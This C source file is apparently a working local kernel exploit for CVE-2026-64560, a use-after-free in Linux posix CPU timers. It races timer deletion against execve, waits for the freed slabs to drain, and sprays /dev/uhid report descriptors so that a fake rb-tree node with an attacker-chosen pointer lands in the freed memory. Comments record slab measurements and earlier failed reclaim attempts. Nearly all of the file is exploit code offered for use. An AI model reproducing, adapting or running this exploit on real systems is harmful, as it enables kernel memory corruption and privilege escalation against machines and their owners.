/*
 * l62.c - CVE-2026-64560 landing with the *correct* reclaim primitive.
 *
 * History: every earlier attempt used 8 KB AF_UNIX frags, which on this kernel
 * land in kmalloc-8k whose slab is order-3 (objperslab 4, pagesperslab 8). The
 * posix_timers_cache slab that holds the dangling timerqueue_node is order-1
 * (21 x 384 B in 8 KB), so those frags could never take it over - measured:
 * spraying 4000 frags left kmalloc-8k.active unchanged (490/497).
 *
 * The primitive that does match is /dev/uhid: uhid_dev_create2() keeps our
 * report descriptor in kmemdup(rd_data, rd_size) for the life of the device, so
 * rd_size = 256 lands in kmalloc-256 - order-1, 32 objects per 8 KB slab, and
 * every byte is attacker controlled. Measured: 2000 devices moved
 * kmalloc-256 from 10376/10688 to 12352/12352.
 *
 * A dangling node sits at page offset 0xe0 + n*0x180, i.e. 224 or 96 mod 256,
 * so a 256-byte descriptor with the fake node written at object offsets 112 and
 * 240 covers both residues:
 *     node +0x00 __rb_parent_color = 0
 *     node +0x08 rb_right          = 0
 *     node +0x10 rb_left           = TARGET
 *
 * Race structure is l60's: the PARENT owns and deletes the timers so every
 * delete really runs (del_ok counts all of them) and empty slabs can reach the
 * buddy allocator, while the victim's NON-LEADER thread calls execve at storm
 * start so de_thread() overlaps timer_delete().
 *
 * usage: l62 <attempts> <timers/victim> <victims> <uhid_count> <drain_max_ms> <target>
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CPUCLOCK_SCHED 2
#define MAX_TIMERS     2048
#define MAXVICTIM      32
#define MAXUHID        40000
#define NWORKER        4

#define ITIMER_NODE_OFF 0x0e0UL
#define FAKE_AT_96      112     /* node at page off 96  -> rb_left at obj+112 */
#define FAKE_AT_224     240     /* node at page off 224 -> rb_left at obj+240 */
#define UHID_RD_SIZE    256

#define UHID_CREATE2 11
#define UHID_DESTROY 1
#define EVENT_SIZE 4380
#define CREATE2_OFF 4
#define BUS_USB 0x03

static unsigned long long g_target;
static unsigned long long g_dummy;

static volatile int *g_go;
static volatile int *g_delgo;
static volatile int *g_delcnt;

struct execarg { int idx; };
struct deljob  { int widx, wcnt, n, victim; int *ids; };

static void *victim_exec_thread(void *arg)
{
    struct execarg *ea = arg;
    while (!g_go[ea->idx])
        sched_yield();
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

static void *delete_storm(void *arg)
{
    struct deljob *j = arg;
    while (!g_delgo[j->victim])
        sched_yield();
    for (int i = j->widx; i < j->n; i += j->wcnt)
        if (syscall(SYS_timer_delete, j->ids[i]) == 0)
            __sync_fetch_and_add((int *)&g_delcnt[j->victim], 1);
    return NULL;
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

/* ---- uhid spray ---- */
static unsigned char g_ev[EVENT_SIZE];
static unsigned char g_desc[UHID_RD_SIZE];
static int *g_fds;

static void build_desc(unsigned long long left)
{
    memset(g_desc, 0, sizeof g_desc);
    memcpy(g_desc + FAKE_AT_96, &left, 8);
    memcpy(g_desc + FAKE_AT_224, &left, 8);
}

static int uhid_create(int fd, int idx)
{
    memset(g_ev, 0, sizeof g_ev);
    *(uint32_t *)g_ev = UHID_CREATE2;
    unsigned char *c2 = g_ev + CREATE2_OFF;
    snprintf((char *)c2, 128, "lh62_%d", idx);
    *(uint16_t *)(c2 + 256) = UHID_RD_SIZE;
    *(uint16_t *)(c2 + 258) = BUS_USB;
    *(uint32_t *)(c2 + 260) = 0x1234;
    *(uint32_t *)(c2 + 264) = (uint32_t)idx;
    *(uint32_t *)(c2 + 268) = 1;
    memcpy(c2 + 276, g_desc, UHID_RD_SIZE);
    ssize_t w = write(fd, g_ev, sizeof g_ev);
    return w == (ssize_t)sizeof g_ev ? 0 : -1;
}

static int uhid_spray(int n)
{
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fd < 0) break;
        if (uhid_create(fd, i) != 0) { close(fd); break; }
        g_fds[made++] = fd;
    }
    return made;
}

static void uhid_trim(int n)
{
    for (int i = 0; i < n; i++) close(g_fds[i]);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        usleep(2000 * 1000);
        _exit(0);
    }

    int attempts = argc > 1 ? atoi(argv[1]) : 200;
    int ntimer   = argc > 2 ? atoi(argv[2]) : 1000;
    int nv       = argc > 3 ? atoi(argv[3]) : 16;
    int nuhid    = argc > 4 ? atoi(argv[4]) : 8000;
    int drain_ms = argc > 5 ? atoi(argv[5]) : 6000;
    if (argc > 6) g_target = strtoull(argv[6], NULL, 0);

    if (ntimer > MAX_TIMERS) ntimer = MAX_TIMERS;
    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nuhid > MAXUHID) nuhid = MAXUHID;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    char *shm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) return 1;
    g_go = (volatile int *)(shm + 0);
    g_delgo = (volatile int *)(shm + 256);
    g_delcnt = (volatile int *)(shm + 512);
    g_fds = calloc(MAXUHID, sizeof(int));
    if (!g_fds) return 1;

    build_desc(g_target);
    printf("l62 target=%#llx attempts=%d timers=%d victims=%d uhid=%d drain=%dms\n",
           g_target, attempts, ntimer, nv, nuhid, drain_ms);
    printf("    fake node: rd_size=%d, rb_left at obj+%d and obj+%d\n",
           UHID_RD_SIZE, FAKE_AT_96, FAKE_AT_224);
    fflush(stdout);

    for (int a = 1; a <= attempts; a++) {
        pid_t vpid[MAXVICTIM];
        int *ids[MAXVICTIM];
        int del_ok = 0;

        for (int j = 0; j < MAXVICTIM; j++) { vpid[j] = -1; ids[j] = NULL; }
        for (int j = 0; j < nv; j++) { g_go[j] = 0; g_delgo[j] = 0; g_delcnt[j] = 0; }

        for (int j = 0; j < nv; j++) {
            pid_t v = fork();
            if (v == 0) {
                signal(SIGUSR1, SIG_IGN);
                struct execarg ea; ea.idx = j;
                pthread_t eth;
                if (pthread_create(&eth, NULL, victim_exec_thread, &ea) != 0) _exit(8);
                for (;;) pause();
            }
            if (v < 0) break;
            vpid[j] = v;

            clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
            ids[j] = calloc((size_t)ntimer, sizeof(int));
            int n = 0;
            for (; n < ntimer; n++) {
                struct sigevent ev;
                struct itimerspec its;
                int id = -1;
                memset(&ev, 0, sizeof ev);
                ev.sigev_notify = SIGEV_SIGNAL;
                ev.sigev_signo = SIGUSR1;
                if (syscall(SYS_timer_create, cid, &ev, &id) != 0) break;
                memset(&its, 0, sizeof its);
                its.it_value.tv_sec = 3600;
                if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0) break;
                ids[j][n] = id;
            }
            if (n < 2) { free(ids[j]); ids[j] = NULL; continue; }

            pthread_t th[NWORKER];
            struct deljob job[NWORKER];
            for (int i = 0; i < NWORKER; i++) {
                job[i].widx = i; job[i].wcnt = NWORKER; job[i].n = n;
                job[i].victim = j; job[i].ids = ids[j];
                pthread_create(&th[i], NULL, delete_storm, &job[i]);
            }
            /* release the storm first, then execve almost immediately so
             * de_thread() lands inside the storm */
            g_delgo[j] = 1;
            sched_yield();
            g_go[j] = 1;
            for (int i = 0; i < NWORKER; i++) pthread_join(th[i], NULL);
            del_ok += g_delcnt[j];
        }

        /* empty slabs need ~3 s to reach the buddy allocator (measured) */
        long long t0 = now_ms();
        int drained = 0, act = -1, tot = -1;
        while (now_ms() - t0 < drain_ms) {
            if (read_posix_slab(&act, &tot) == 0 && (now_ms() - t0) >= 2500 && tot < 1200) {
                drained = 1;
                break;
            }
            usleep(100000);
        }
        long long drain_used = now_ms() - t0;

        int made = uhid_spray(nuhid);

        for (int j = 0; j < nv; j++)
            if (vpid[j] > 0) kill(vpid[j], SIGKILL);
        usleep(250000);

        uhid_trim(made);
        for (int j = 0; j < nv; j++) free(ids[j]);

        printf("attempt=%d del_ok=%d drained=%d(%lldms) slab=%d/%d uhid=%d\n",
               a, del_ok, drained, drain_used, act, tot, made);
        fflush(stdout);
    }
    printf("DONE\n");
    return 0;
}


